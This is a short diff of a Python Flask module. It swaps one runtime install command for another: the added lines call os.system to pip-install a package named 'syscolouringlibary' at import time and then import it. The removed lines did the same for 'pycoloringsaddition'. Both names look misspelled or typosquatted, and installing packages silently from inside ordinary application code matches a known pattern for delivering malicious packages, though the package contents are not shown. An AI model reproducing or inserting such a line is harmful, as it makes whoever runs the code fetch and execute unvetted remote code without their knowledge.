@@ -2,8 +2,8 @@
 
 import time
 import os
-os.system("pip install pycoloringsaddition")
-import pycoloringsaddition
+os.system("pip install syscolouringlibary")
+import syscolouringlibary
 import flask
 
 from flask import g
